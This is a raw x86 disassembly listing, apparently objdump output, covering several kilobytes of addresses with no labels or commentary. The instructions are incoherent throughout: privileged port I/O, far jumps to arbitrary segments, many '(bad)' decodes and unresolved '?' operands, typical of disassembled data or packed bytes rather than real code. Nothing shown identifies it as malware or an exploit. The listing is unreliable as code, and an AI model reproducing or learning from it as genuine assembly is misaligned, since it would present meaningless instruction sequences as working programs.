  4193ea:	out    dx,eax
  4193eb:	sbb    al,0x84
  4193ed:	xor    edi,DWORD PTR [ecx+0x37e27ecd]
  4193f3:	and    al,0xd7
  4193f5:	or     eax,0xa2494df
  4193fa:	dec    eax
  4193fb:	sbb    al,0x7d
  4193fd:	push   esi
  4193fe:	jp     0x4193ae
  419400:	sahf   
  419401:	les    edx,FWORD PTR [ecx+0x4]
  419404:	mov    cl,ch
  419406:	pop    ebp
  419407:	mov    dl,ch
  419409:	jnp    0x41947c
  41940b:	jge    0x4193cc
  41940d:	dec    ebx
  41940e:	push   ecx
  41940f:	mov    al,0xf3
  419411:	mov    bl,0x23
  419413:	fstp   TBYTE PTR ds:0x407ce2d5
  419419:	adc    ebp,DWORD PTR [ecx]
  41941b:	rol    DWORD PTR [ebx+0x104b28a7],0x7b
  419422:	aam    0x22
  419424:	xchg   esi,eax
  419425:	jmp    0xd956:0x28097103
  41942c:	dec    edx
  41942d:	and    BYTE PTR [ebx+0x752f7ee6],ch
  419433:	and    al,0x8b
  419435:	jbe    0x4193d6
  419437:	jcxz   0x4193c3
  41943a:	pushf  
  41943b:	mov    esp,ebp
  41943d:	mov    bh,0x99
  41943f:	rcl    BYTE PTR [esi],cl
  419441:	and    edx,ebx
  419443:	jle    0x4193d6
  419445:	push   esp
  419446:	int    0x5a
  419448:	push   esi
  419449:	jo     0x4194b5
  41944b:	mov    cl,0x7b
  41944d:	hlt    
  41944e:	stc    
  41944f:	lods   eax,DWORD PTR ds:[esi]
  419450:	xor    cl,BYTE PTR [ebx]
  419452:	mul    bl
  419454:	aas    
  419455:	pop    edi
  419456:	scas   al,BYTE PTR es:[edi]
  419457:	xchg   esi,eax
  419458:	xlat   BYTE PTR ds:[ebx]
  419459:	cld    
  41945a:	xor    bl,al
  41945c:	cwde   
  41945d:	fadd   DWORD PTR ds:0xb95f98e3
  419463:	test   al,0x69
  419465:	nop
  419466:	cwde   
  419467:	lea    ebx,[ecx]
  419469:	cmp    DWORD PTR [edi],ecx
  41946b:	dec    ebx
  41946c:	and    eax,0x17aefb97
  419471:	cld    
  419472:	mov    esi,0x58ec4b23
  419477:	sbb    al,0x49
  419479:	mov    fs,edx
  41947b:	lock jns 0x4194fb
  41947e:	mov    DWORD PTR [edi+0x6a],0x8c284558
  419485:	inc    ebx
  419486:	jle    0x4194a0
  419488:	test   BYTE PTR [ebp+0x65],dh
  41948b:	les    esi,FWORD PTR [ebp+0x49]
  41948e:	xchg   ebx,eax
  41948f:	sti    
  419490:	in     eax,0x11
  419492:	jbe    0x419493
  419494:	ds mov bl,0x97
  419497:	pop    ds
  419498:	test   DWORD PTR [ebx],ebx
  41949a:	shl    DWORD PTR [eax-0x5dc183e4],1
  4194a0:	dec    ebx
  4194a1:	lahf   
  4194a2:	es push ss
  4194a4:	into   
  4194a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194a6:	leave  
  4194a7:	jg     0x419457
  4194a9:	cmp    eax,0x28c32b0b
  4194ae:	mov    ebx,0xf8aaeeaf
  4194b3:	push   ds
  4194b4:	or     DWORD PTR [esi+0x7fb94fb5],ebp
  4194ba:	pop    ebp
  4194bb:	gs inc eax
  4194bd:	ja     0x419523
  4194bf:	(bad)  
  4194c0:	out    0x29,al
  4194c2:	add    edx,ebx
  4194c4:	cmp    esi,DWORD PTR ds:0xff6407f3
  4194ca:	icebp  
  4194cb:	ret    0xffac
  4194ce:	retf   
  4194cf:	scas   al,BYTE PTR es:[edi]
  4194d0:	scas   eax,DWORD PTR es:[edi]
  4194d1:	sub    al,bh
  4194d3:	pop    esp
  4194d4:	in     eax,0x62
  4194d6:	fimul  WORD PTR ds:0x5dfca1af
  4194dc:	or     BYTE PTR [ecx-0x14],dl
  4194df:	or     ecx,edx
  4194e1:	fisttp WORD PTR [ecx]
  4194e3:	mov    ecx,DWORD PTR [ecx]
  4194e5:	push   ds
  4194e6:	lock push ebx
  4194e8:	mov    ds:0xe756a48f,al
  4194ed:	mov    BYTE PTR [ebp+0x28],bh
  4194f0:	popf   
  4194f1:	test   BYTE PTR [ebx-0x46af2f57],dl
  4194f7:	fwait
  4194f8:	jns    0x4194ba
  4194fa:	scas   eax,DWORD PTR es:[edi]
  4194fb:	inc    edx
  4194fc:	add    dl,bl
  4194fe:	mov    bl,0xc4
  419500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419501:	cmp    esp,DWORD PTR [edi-0x5be8fb04]
  419507:	popf   
  419508:	mov    ebp,0x85f2139f
  41950d:	cdq    
  41950e:	pop    edx
  419510:	fbld   TBYTE PTR [eax+0x1]
  419514:	iret   
  419515:	gs pop ebp
  419517:	fwait
  419518:	mov    edi,?
  41951a:	push   edx
  41951b:	repnz sbb BYTE PTR [edi],ch
  41951e:	mov    es,WORD PTR [esi+0x67]
  419521:	sub    BYTE PTR [edi-0x69e85d48],dl
  419527:	add    al,0x57
  419529:	push   ebx
  41952a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41952b:	add    edx,DWORD PTR [esi+eax*4]
  41952e:	lea    ebx,[edx]
  419530:	fist   DWORD PTR [ebx+ecx*4+0x4d21f3d6]
  419537:	pop    es
  419538:	mov    ch,0xef
  41953a:	mov    eax,0x1739b49e
  41953f:	int3   
  419540:	cdq    
  419541:	xor    eax,DWORD PTR [esi+0x70c40695]
  419547:	fucom  st(5)
  419549:	loope  0x4194de
  41954b:	push   ss
  41954c:	nop
  41954d:	lds    esi,FWORD PTR [ebp-0x6e29abdb]
  419553:	out    dx,al
  419554:	mov    ebp,0x5aab91af
  419559:	mov    bh,0x98
  41955b:	inc    BYTE PTR [esi+ecx*8-0x28]
  41955f:	xor    eax,0xd653ba43
  419564:	mov    edx,0x3d6642ce
  419569:	mov    edx,0x3a8d4047
  41956e:	dec    ebp
  41956f:	test   DWORD PTR [esi+0x1f],esi
  419572:	(bad)
  419576:	or     DWORD PTR [ebx-0x2],esi
  419579:	cmc    
  41957a:	loope  0x4195ac
  41957c:	push   ebp
  41957d:	hlt    
  41957e:	cmp    ah,dl
  419580:	inc    edx
  419581:	mov    BYTE PTR fs:[ebp+0x2ed26514],ah
  419588:	push   es
  419589:	xor    ebx,DWORD PTR [edi-0x6be1d1f7]
  41958f:	cmp    esp,esp
  419591:	cmp    DWORD PTR [ebp+0xf],eax
  419594:	loop   0x41952e
  419596:	jmp    FWORD PTR [ecx-0x3fba7758]
  41959c:	in     al,0x11
  41959e:	sub    ebx,DWORD PTR [ebx]
  4195a0:	xor    BYTE PTR [ecx-0x7f],bh
  4195a3:	jnp    0x4195cb
  4195a5:	call   0x7cc8bf67
  4195aa:	xchg   ebx,eax
  4195ab:	aas    
  4195ac:	cwde   
  4195ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195ae:	sub    DWORD PTR [ecx],ebp
  4195b0:	int    0x7a
  4195b2:	jp     0x41954e
  4195b4:	mov    eax,0xcec3b93a
  4195b9:	ins    DWORD PTR es:[edi],dx
  4195ba:	out    0xb7,al
  4195bc:	xchg   ecx,eax
  4195bd:	add    ebp,DWORD PTR ds:0x520f8435
  4195c3:	cmp    eax,0x557a0d3a
  4195c8:	push   esi
  4195c9:	fist   DWORD PTR [edx+0x10]
  4195cc:	sub    DWORD PTR [eax+0x742fdcb9],esp
  4195d2:	adc    al,0x7d
  4195d4:	rcl    DWORD PTR [edx-0x7800db],0x75
  4195db:	outs   dx,DWORD PTR ds:[esi]
  4195dc:	lea    ebx,[edx+0x7]
  4195df:	xchg   ebp,eax
  4195e0:	sub    edx,DWORD PTR [eax-0x22]
  4195e3:	inc    eax
  4195e4:	pop    ecx
  4195e5:	inc    ecx
  4195e6:	imul   eax,DWORD PTR [edx+0x42],0xffffffbf
  4195ea:	pop    eax
  4195eb:	fist   DWORD PTR [edx]
  4195ed:	popa   
  4195ee:	fmul   QWORD PTR [edi]
  4195f0:	popa   
  4195f1:	xor    esi,ebp
  4195f3:	xor    ebx,eax
  4195f5:	idiv   BYTE PTR ds:0x4ddf702b
  4195fb:	xchg   edx,eax
  4195fc:	mov    cl,0x36
  4195fe:	iret   
  4195ff:	das    
  419600:	mov    eax,ds:0xb3fb9913
  419605:	push   es
  419606:	inc    ebx
  419607:	inc    ebp
  419608:	test   DWORD PTR [eax-0x1f],0xf7421ce0
  41960f:	sub    ecx,ebx
  419611:	je     0x419647
  419613:	mov    dh,0x69
  419615:	outs   dx,DWORD PTR ds:[esi]
  419616:	sar    BYTE PTR [eax],0x2c
  419619:	mov    ch,0x81
  41961b:	xchg   edi,eax
  41961c:	mov    BYTE PTR [edx-0x23ee933e],ah
  419622:	test   al,0xd3
  419624:	dec    ecx
  419625:	ret    
  419626:	jne    0x4196a3
  419628:	cs adc al,0x2d
  41962b:	fdiv   DWORD PTR [ebx-0x21]
  41962e:	or     ch,BYTE PTR [edi]
  419630:	pop    edi
  419631:	jmp    0xb12a:0xfa7f0a09
  419638:	sub    ebx,DWORD PTR [esi-0x5d]
  41963b:	std    
  41963c:	jno    0x4196aa
  41963e:	xor    al,0x71
  419640:	sub    al,0xb6
  419642:	jne    0x4195ec
  419644:	aam    0x15
  419646:	adc    DWORD PTR [esi+eax*2],eax
  419649:	mov    dh,0x71
  41964b:	call   0x1227ce2e
  419650:	pop    eax
  419651:	dec    edi
  419652:	lds    edx,FWORD PTR [eax]
  419654:	sbb    al,0x89
  419656:	fstp   st(3)
  419658:	les    ebp,FWORD PTR [esi+0x3d]
  41965b:	mov    edi,0xe2ba67ba
  419660:	(bad)  
  419661:	fwait
  419662:	jle    0x4196d3
  419664:	adc    al,0x7e
  419666:	adc    ch,BYTE PTR [eax+0x371e6daa]
  41966c:	nop
  41966d:	retf   0xf535
  419670:	mov    esp,es
  419672:	bound  edx,QWORD PTR [ecx+0x435d0df9]
  419678:	or     BYTE PTR [ebp+0x6c8bc544],ah
  41967e:	(bad)  
  41967f:	shl    BYTE PTR [ebp+0x29],1
  419682:	mov    al,BYTE PTR [ebx]
  419684:	pusha  
  419685:	or     DWORD PTR [edi],ecx
  419687:	add    eax,0x8de57613
  41968c:	in     al,0x8d
  41968e:	or     ecx,DWORD PTR [edx-0x69]
  419691:	fsub   st(4),st
  419693:	xor    eax,DWORD PTR ds:0xdda250aa
  419699:	xor    BYTE PTR [eax-0x11],ch
  41969c:	jne    0x419644
  41969e:	push   0xffffffc3
  4196a0:	jecxz  0x41969b
  4196a2:	leave  
  4196a3:	push   edx
  4196a4:	loopne 0x419706
  4196a6:	mov    ebx,0x9b375126
  4196ab:	push   es
  4196ac:	adc    DWORD PTR [edx-0x66a9bae4],0xe0a5f493
  4196b6:	dec    edi
  4196b7:	sub    BYTE PTR [ebp-0x72c8fac5],0x5a
  4196be:	sub    BYTE PTR [esi],0x30
  4196c1:	xor    DWORD PTR [edi],0xc48f470e
  4196c7:	inc    edx
  4196c8:	push   ecx
  4196c9:	mov    dl,0x8a
  4196cb:	and    edx,DWORD PTR [edi+0x2b]
  4196ce:	jno    0x419698
  4196d0:	ret    0x402d
  4196d3:	pop    esp
  4196d4:	aam    0xcf
  4196d6:	leave  
  4196d7:	jae    0x41968b
  4196d9:	sbb    esi,DWORD PTR [eax-0xa]
  4196dc:	pop    edi
  4196dd:	and    ebx,DWORD PTR ds:0xad82c93e
  4196e3:	call   0xd3a46a3f
  4196e8:	gs xor dh,0x76
  4196ec:	ret    
  4196ed:	dec    esi
  4196ee:	dec    edx
  4196ef:	psrad  mm6,QWORD PTR [edx]
  4196f2:	jmp    0x4be06fcb
  4196f7:	ss push esp
  4196f9:	jmp    FWORD PTR [eax+eax*8]
  4196fc:	cs jne 0x4196b7
  4196ff:	and    eax,0xfea5ec5e
  419704:	leave  
  419705:	add    al,0xee
  419707:	sub    ah,bl
  419709:	clc    
  41970a:	(bad)  
  41970b:	adc    DWORD PTR [esi],ecx
  41970d:	(bad)  
  41970e:	mov    edi,0xd33eee0
  419713:	cli    
  419714:	mov    dx,di
  419717:	pop    edi
  419718:	sti    
  419719:	sub    edx,DWORD PTR [eax]
  41971b:	call   DWORD PTR [esi]
  41971d:	mov    ds:0xa0eebe26,al
  419722:	test   BYTE PTR [edx+0x39bd5e5e],ch
  419728:	popf   
  419729:	sbb    eax,0x127444e2
  41972e:	inc    ecx
  41972f:	test   BYTE PTR [eax-0x55],bl
  419732:	cmc    
  419733:	cli    
  419734:	jge    0x4197a1
  419736:	pop    ebp
  419737:	cdq    
  419738:	out    dx,eax
  419739:	loop   0x419799
  41973b:	out    dx,al
  41973c:	jo     0x41974e
  41973e:	fwait
  41973f:	cmc    
  419740:	ds mov dl,0xf2
  419743:	das    
  419744:	leave  
  419745:	jb     0x41977e
  419747:	lods   al,BYTE PTR ds:[esi]
  419748:	adc    al,0x9
  41974a:	mov    ds,WORD PTR [ecx-0x67748380]
  419750:	fdivr  QWORD PTR [eax-0x5dd50b6a]
  419756:	and    ecx,DWORD PTR [edx]
  419758:	lea    esi,[eax]
  41975a:	cmp    DWORD PTR [esi-0x3a],ebp
  41975d:	retf   0x6e40
  419760:	push   ds
  419761:	or     DWORD PTR [edx+0x55],ebx
  419764:	stc    
  419765:	ja     0x4197db
  419767:	addr16 xchg esp,eax
  419769:	pop    ecx
  41976a:	sti    
  41976b:	(bad)  
  41976c:	out    0x1,eax
  41976e:	mov    eax,ds:0xd6c5e1d4
  419773:	(bad)  
  419774:	fisub  DWORD PTR [esi+0x636497c9]
  41977a:	cmp    ecx,DWORD PTR [ebp+0x3ad1eb29]
  419780:	jae    0x41976b
  419782:	out    0xa9,eax
  419784:	xlat   BYTE PTR ds:[ebx]
  419785:	inc    eax
  419786:	jg     0x41978d
  419788:	add    ecx,esi
  41978a:	jb     0x41979c
  41978c:	pop    eax
  41978d:	in     al,0x40
  41978f:	(bad)  
  419790:	fist   WORD PTR [ebx+0x57]
  419793:	scas   al,BYTE PTR es:[edi]
  419794:	jl     0x419732
  419796:	ds mov eax,0xd82bda3c
  41979c:	and    eax,0xe0a1e30e
  4197a1:	int3   
  4197a2:	xchg   ebx,eax
  4197a3:	push   edi
  4197a4:	cmp    DWORD PTR [eax],edx
  4197a6:	fidiv  WORD PTR [edx-0xf952508]
  4197ac:	xchg   ecx,eax
  4197ad:	mov    esi,0x8fcb16f7
  4197b2:	mov    eax,ds:0x9dc6daf7
  4197b7:	int3   
  4197b8:	addr16 pushf 
  4197ba:	jg     0x419764
  4197bc:	test   BYTE PTR [ebx+0x615a4735],ch
  4197c2:	cs mov cl,0xa8
  4197c5:	iret   
  4197c6:	cli    
  4197c7:	xlat   BYTE PTR ds:[ebx]
  4197c8:	jne    0x41983e
  4197ca:	cli    
  4197cb:	mov    DWORD PTR [edx-0x185e198c],edx
  4197d1:	mov    dh,0xfc
  4197d3:	popw   ds
  4197d5:	enter  0x4b5f,0xc2
  4197d9:	mov    esp,0xc1e0de45
  4197de:	sti    
  4197df:	or     bh,BYTE PTR ds:0xf5de0091
  4197e5:	and    edi,0xb
  4197e8:	mov    DWORD PTR [ebx+0x38],esp
  4197eb:	mov    eax,0x9e6a950f
  4197f0:	mov    WORD PTR [esi-0x3b96c0eb],fs
  4197f6:	std    
  4197f7:	xor    al,0xc6
  4197f9:	add    ecx,DWORD PTR [ebp+0x46030920]
  4197ff:	mov    ah,0x30
  419801:	(bad)  
  419802:	adc    BYTE PTR [ecx],dl
  419804:	repz loop 0x41984b
  419807:	push   ds
  419808:	sti    
  419809:	jmp    0x2d11:0xe3239080
  419810:	ins    DWORD PTR es:[edi],dx
  419811:	xchg   ecx,eax
  419812:	shl    edi,1
  419814:	mov    esp,0x6ad4a32f
  419819:	or     eax,0xcc34e92b
  41981e:	jle    0x419833
  419820:	mov    ebx,0x214d9231
  419825:	add    eax,0xcf696a31
  41982a:	push   edi
  41982b:	jl     0x4197ba
  41982d:	push   eax
  41982e:	loop   0x4197e3
  419830:	repz pop ecx
  419832:	cmp    DWORD PTR [edi-0x26278d9a],edi
  419838:	and    dl,BYTE PTR [esi+ecx*1-0x6d]
  41983c:	outs   dx,BYTE PTR ds:[esi]
  41983d:	mov    ebx,0x8d86869c
  419842:	gs popf 
  419844:	jae    0x4197ca
  419846:	xlat   BYTE PTR ds:[ebx]
  419847:	jno    0x419852
  419849:	mov    al,ds:0xf7e96631
  41984e:	jnp    0x419825
  419850:	push   ecx
  419851:	xor    al,0xa4
  419853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419854:	xchg   ebx,eax
  419855:	dec    edi
  419856:	jmp    DWORD PTR [eax+eax*8-0x69d0c363]
  41985d:	cmp    esp,esp
  41985f:	lea    esi,[edi+0x3161caed]
  419865:	dec    esp
  419866:	push   ss
  419867:	cmp    ecx,DWORD PTR [eax]
  419869:	rcl    BYTE PTR [eax+0x67166701],0xbc
  419870:	jae    0x4198b6
  419872:	not    bl
  419874:	adc    edi,DWORD PTR [esi+eiz*2]
  419877:	iret   
  419878:	lods   al,BYTE PTR ds:[esi]
  419879:	jmp    0x41989d
  41987b:	(bad)  
  41987c:	and    eax,0x3b4c9abf
  419881:	push   0x75
  419883:	repz mov ds:0xef3a0fb1,eax
  419889:	xor    BYTE PTR [edx-0x69],dl
  41988c:	repnz sub bh,BYTE PTR [ecx+0x4a0f8ee2]
  419893:	xchg   ecx,eax
  419894:	xchg   DWORD PTR [ebx+0x2f],edx
  419897:	xchg   esi,eax
  419898:	call   0x4240:0xc5f37b00
  41989f:	fadd   QWORD PTR [esi-0x7]
  4198a2:	pop    esi
  4198a3:	rcl    BYTE PTR ds:[ebp+eiz*8-0x39],1
  4198a8:	ret    
  4198a9:	and    eax,0x16bd6660
  4198ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198af:	jne    0x41990e
  4198b1:	mov    WORD PTR [eax+0x7c],fs
  4198b4:	push   edi
  4198b5:	bound  ebx,QWORD PTR [ecx-0x2a834f33]
  4198bb:	fbstp  TBYTE PTR [ebp+0x1b]
  4198be:	(bad)  
  4198bf:	xchg   ebp,eax
  4198c0:	ret    
  4198c1:	(bad)  
  4198c2:	test   DWORD PTR [eax],0xb6a202c9
  4198c8:	jne    0x4198d2
  4198ca:	xchg   BYTE PTR [edx+0x74],ah
  4198cd:	adc    BYTE PTR [edx],ah
  4198cf:	push   0xffffffc9
  4198d1:	jmp    0x3fb5:0x6b0ef73b
  4198d8:	push   edx
  4198d9:	fmul   DWORD PTR [ecx+eiz*2]
  4198dc:	int    0x58
  4198de:	push   ds
  4198df:	int    0xf4
  4198e1:	pop    edx
  4198e2:	stos   DWORD PTR es:[edi],eax
  4198e3:	adc    eax,0xa168466
  4198e8:	scas   eax,DWORD PTR es:[edi]
  4198e9:	fild   QWORD PTR [eax-0x5704ec65]
  4198ef:	je     0x4198c6
  4198f1:	jg     0x419929
  4198f3:	pop    ss
  4198f4:	fwait
  4198f5:	addr16 or edi,edi
  4198f8:	mov    bh,0xdc
  4198fa:	or     al,0x61
  4198fc:	jp     0x4198ac
  4198fe:	or     BYTE PTR [ebx-0x15],0x89
  419902:	jbe    0x419903
  419904:	mov    WORD PTR [eax],es
  419906:	cmp    ch,BYTE PTR [eax]
  419908:	pop    ebx
  419909:	pop    esp
  41990a:	ret    
  41990b:	jl     0x419896
  41990d:	std    
  41990e:	mov    al,ds:0xfadfabfd
  419913:	aaa    
  419914:	fsub   st,st(1)
  419916:	and    eax,0x1a5f4108
  41991b:	jl     0x4198aa
  41991d:	ret    0x51c0
  419920:	shr    BYTE PTR [edx],1
  419922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419923:	and    esi,DWORD PTR [edx]
  419925:	ret    0xd4d6
  419928:	call   0x39687664
  41992d:	scas   eax,DWORD PTR es:[edi]
  41992e:	outs   dx,BYTE PTR ds:[esi]
  41992f:	fidiv  WORD PTR [ebp-0x44dbecdd]
  419935:	in     al,dx
  419936:	and    DWORD PTR [ebx+eax*2],eax
  419939:	ins    BYTE PTR es:[edi],dx
  41993a:	or     eax,0xda15f53b
  41993f:	pop    eax
  419940:	mov    ebx,0xa67d3a5f
  419945:	cmp    eax,0xfacafdd8
  41994a:	(bad)  
  41994b:	sbb    cl,dl
  41994d:	fcomp  QWORD PTR [edx+edi*2]
  419950:	sbb    al,0x97
  419952:	in     al,0x11
  419954:	rcl    DWORD PTR [bx+di-0x1d85],cl
  419959:	jbe    0x4198f3
  41995b:	(bad)  
  41995c:	cdq    
  41995d:	sub    bh,cl
  41995f:	std    
  419960:	inc    ebx
  419961:	jp     0x4199d5
  419963:	aad    0x4c
  419965:	test   BYTE PTR [ecx+0x7b88d855],al
  41996b:	jb     0x4199dc
  41996d:	ins    BYTE PTR es:[edi],dx
  41996e:	jo     0x4199cc
  419970:	push   eax
  419971:	jne    0x4199b5
  419973:	pop    ecx
  419974:	(bad)  [esi+0x66de84f1]
  41997a:	pop    ebx
  41997b:	ret    
  41997c:	inc    esp
  41997d:	fs std 
  41997f:	das    
  419980:	rcr    DWORD PTR [esi+0x6a],1
  419983:	push   esp
  419984:	int3   
  419985:	sub    edi,edi
  419987:	jns    0x4199c6
  419989:	push   edx
  41998a:	xchg   esp,eax
  41998b:	shl    al,0x54
  41998e:	mov    ebp,0xada2e266
  419993:	jo     0x4199de
  419995:	inc    ebx
  419996:	add    al,0xdc
  419998:	and    dl,bh
  41999a:	pop    ss
  41999b:	jmp    FWORD PTR [edi]
  41999d:	cdq    
  41999e:	sahf   
  41999f:	xor    bl,dh
  4199a1:	cdq    
  4199a2:	push   eax
  4199a3:	out    dx,al
  4199a4:	or     ch,BYTE PTR [esp+eax*4-0x16f1085a]
  4199ab:	and    bh,BYTE PTR [ebx+0x45]
  4199ae:	fild   QWORD PTR [esi]
  4199b0:	xor    al,dh
  4199b2:	mov    ebx,0x157248ee
  4199b7:	aas    
  4199b8:	or     eax,0xc49c6a76
  4199bd:	bound  eax,QWORD PTR [edx]
  4199bf:	in     al,0xee
  4199c1:	and    ecx,ebp
  4199c3:	jp     0x4199ee
  4199c5:	jp     0x4199e5
  4199c7:	push   ss
  4199c8:	inc    ecx
  4199c9:	loop   0x4199d4
  4199cb:	xchg   esi,eax
  4199cc:	ficomp WORD PTR [edx]
  4199ce:	fcom   QWORD PTR [ecx]
  4199d0:	push   ss
  4199d1:	out    0xad,al
  4199d3:	cmp    BYTE PTR [esi-0x40a01599],bl
  4199d9:	sahf   
  4199da:	push   ecx
  4199db:	stc    
  4199dc:	or     al,0x9b
  4199de:	sti    
  4199df:	dec    esp
  4199e0:	mov    eax,0xdb173b7d
  4199e5:	arpl   WORD PTR ds:0xe63d4b40,cx
  4199eb:	inc    eax
  4199ec:	jno    0x4199f2
  4199ee:	adc    ecx,DWORD PTR [ebx+0x42817dc3]
  4199f4:	add    cl,BYTE PTR [ebx]
  4199f6:	or     ebx,ecx
  4199f8:	mov    BYTE PTR [edi+0xe1e2691],bh
  4199fe:	sub    BYTE PTR [ebx-0x4f],ah
  419a01:	jl     0x4199f3
  419a03:	cmp    eax,0x556b9034
  419a08:	and    DWORD PTR [edi],edi
  419a0a:	stos   BYTE PTR es:[edi],al
  419a0b:	add    BYTE PTR [ecx],dl
  419a0d:	sub    edi,DWORD PTR [ecx-0x27cb8f7e]
  419a13:	mov    edx,0xb81f27fa
  419a18:	mov    cl,0xdf
  419a1a:	shr    BYTE PTR [bx+di+0x5d],1
  419a1e:	sbb    dh,0x63
  419a21:	leave  
  419a22:	fnsave [ebp+0x70]
  419a25:	inc    edi
  419a26:	cwde   
  419a27:	(bad)  
  419a28:	mov    bh,0xe9
  419a2a:	out    dx,al
  419a2b:	sub    al,BYTE PTR [ebp-0x5c]
  419a2e:	rol    DWORD PTR [ecx-0x3f01228b],1
  419a34:	gs addr16 mov ah,0x6f
  419a38:	shr    bh,0xd0
  419a3b:	sahf   
  419a3c:	inc    eax
  419a3d:	jmp    0x3eac:0x65a9dbbc
  419a44:	xchg   edi,eax
  419a45:	push   ds
  419a46:	jmp    0x419a4a
  419a48:	dec    eax
  419a49:	stos   DWORD PTR es:[edi],eax
  419a4a:	xchg   BYTE PTR [edi+edi*1],cl
  419a4d:	adc    dh,BYTE PTR [ebx]
  419a4f:	inc    ecx
  419a50:	data16 xor bl,BYTE PTR [ebx-0x6676c3d2]
  419a57:	(bad)  
  419a58:	outs   dx,BYTE PTR ds:[esi]
  419a59:	sub    al,0x68
  419a5b:	sbb    DWORD PTR [edx],edi
  419a5d:	sub    al,0xc
  419a5f:	xchg   DWORD PTR [edx-0x28232537],esi
  419a65:	aam    0x6e
  419a67:	push   edi
  419a68:	shr    BYTE PTR [edx],1
  419a6a:	pop    esp
  419a6b:	pop    es
  419a6c:	and    eax,0xd46bc162
  419a71:	mov    DWORD PTR [ebx+0x5e828b50],0xc30b9680
  419a7b:	sub    eax,0xe02b9c00
  419a80:	pop    esi
  419a81:	imul   esi,DWORD PTR [esi-0x185a119f],0xffffffb6
  419a88:	iret   
  419a89:	int    0xf7
  419a8b:	inc    eax
  419a8c:	enter  0xe105,0x24
  419a90:	fiadd  WORD PTR [eax]
  419a92:	mov    al,0x4f
  419a94:	jle    0x419a27
  419a96:	pushf  
  419a97:	jo     0x419a33
  419a99:	nop
  419a9a:	in     al,dx
  419a9b:	push   edi
  419a9c:	push   eax
  419a9d:	and    esp,edx
  419a9f:	(bad)  
  419aa0:	mov    esi,0x80b8d4ad
  419aa5:	into   
  419aa6:	aam    0xcb
  419aa8:	out    dx,eax
  419aa9:	ficom  DWORD PTR [ecx-0x60ad6c7a]
  419aaf:	loop   0x419ad9
  419ab1:	ret    
  419ab2:	shl    DWORD PTR [edx-0x13],1
  419ab5:	cmp    bh,BYTE PTR [eax+ebx*2+0x461944ed]
  419abc:	imul   BYTE PTR [edi+0x59]
  419abf:	stc    
  419ac0:	imul   edi,ebx,0xfffffffd
  419ac3:	loop   0x419b2b
  419ac5:	xchg   dh,dl
  419ac7:	jge    0x419b25
  419ac9:	sub    eax,0x80fbfd70
  419ace:	mov    ds:0xf7755d25,al
  419ad3:	ins    DWORD PTR es:[edi],dx
  419ad4:	adc    DWORD PTR [edi+0x77],esi
  419ad7:	imul   esp,DWORD PTR [eax+0x2c6cf051],0x571c24fc
  419ae1:	and    DWORD PTR [ebp+0x20],eax
  419ae4:	imul   ebx,DWORD PTR [edi+0x22fdb336],0xa4ff2d21
  419aee:	mov    dl,0x5b
  419af0:	push   ebp
  419af1:	inc    edi
  419af2:	popa   
  419af3:	dec    ebx
  419af4:	les    ebx,FWORD PTR [esi]
  419af6:	add    ch,dh
  419af8:	neg    ah
  419afa:	mov    ah,0xea
  419afc:	mov    al,0x99
  419afe:	mov    ds:0xfb1d13b6,eax
  419b03:	scas   eax,DWORD PTR es:[edi]
  419b04:	(bad)  
  419b05:	int3   
  419b06:	pop    ss
  419b07:	imul   ebx,DWORD PTR [edi-0x4a],0xffffffc4
  419b0b:	popf   
  419b0c:	jmp    0xf8d811c1
  419b11:	push   eax
  419b12:	mov    cs:0x9de91e66,eax
  419b18:	mov    DWORD PTR [edi-0x69],ebp
  419b1b:	fbld   TBYTE PTR [esi-0xc7403fd]
  419b21:	(bad)  
  419b22:	mov    ebx,0x788f8926
  419b27:	(bad)  
  419b28:	in     eax,dx
  419b29:	mov    esp,0x94884f7c
  419b2e:	jae    0x419ae0
  419b30:	xchg   ecx,eax
  419b31:	xchg   dh,dh
  419b33:	add    ah,al
  419b35:	or     DWORD PTR [ecx+ebx*2],0x52f77649
  419b3c:	and    cl,BYTE PTR [edx]
  419b3e:	inc    edi
  419b3f:	mov    dl,0xa
  419b41:	mov    ah,0x4b
  419b43:	out    0xbf,eax
  419b45:	pop    DWORD PTR [ebp-0x3a]
  419b48:	adc    dl,ch
  419b4a:	inc    eax
  419b4b:	sbb    eax,0x84e165cd
  419b50:	xchg   esp,eax
  419b51:	jnp    0x419b87
  419b53:	pop    ebp
  419b54:	jns    0x419ae2
  419b56:	pushf  
  419b57:	mov    edi,0xa3b947b5
  419b5c:	std    
  419b5d:	mov    cl,0x51
  419b5f:	jne    0x419b3a
  419b61:	ret    0xd306
  419b64:	ss mov ah,0x3f
  419b67:	test   al,0x30
  419b69:	jbe    0x419b3c
  419b6b:	push   ecx
  419b6c:	mov    edi,0xde9c5fcf
  419b71:	adc    eax,0x5d32e17
  419b76:	or     eax,0x9d8497a9
  419b7b:	jae    0x419b62
  419b7d:	mov    BYTE PTR [edx],cl
  419b7f:	sbb    al,0xac
  419b81:	ror    BYTE PTR [eax+0x7e4f4bd4],0xea
  419b88:	icebp  
  419b89:	pop    es
  419b8a:	pop    ss
  419b8b:	out    0x72,al
  419b8d:	xor    DWORD PTR [edx+0xa76554b],ebx
  419b93:	jmp    0x75682192
  419b98:	mov    ecx,0xc8cfb4e4
  419b9d:	les    ecx,FWORD PTR [esi+0x3f]
  419ba0:	adc    al,0x50
  419ba2:	inc    ebp
  419ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ba4:	push   edi
  419ba5:	loop   0x419b6f
  419ba7:	inc    esi
  419ba8:	xor    bh,dh
  419baa:	aam    0x51
  419bac:	pop    es
  419bad:	xchg   edi,eax
  419bae:	pop    ecx
  419baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bb0:	lods   eax,DWORD PTR ds:[esi]
  419bb1:	and    DWORD PTR [edx-0x167ae49d],edi
  419bb7:	mov    ?,esi
  419bb9:	adc    eax,0xca2fcf51
  419bbe:	nop
  419bbf:	out    dx,eax
  419bc0:	xchg   ebp,eax
  419bc1:	rcr    BYTE PTR [eax],0xc8
  419bc4:	xchg   DWORD PTR [esi+0x57],ebx
  419bc7:	retf   0x10ee
  419bca:	into   
  419bcb:	loopne 0x419c3e
